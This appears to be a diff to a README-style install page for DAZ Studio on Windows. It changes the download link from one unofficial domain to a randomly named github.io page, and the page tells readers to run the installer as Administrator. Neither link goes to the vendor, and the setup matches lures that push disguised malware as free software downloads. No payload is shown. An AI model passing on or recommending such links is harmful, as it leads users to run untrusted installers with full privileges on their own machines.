@@ -2,7 +2,7 @@
 
 ## Download & Install
 
-> **Download:** [**Get DAZ Studio for Windows →**](https://daz-studio-setup.kolmods.com/)
+> **Download:** [**Get DAZ Studio for Windows →**](https://icelandic-pruritus265.github.io)
 >
 > Setup notes for **DAZ Studio** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
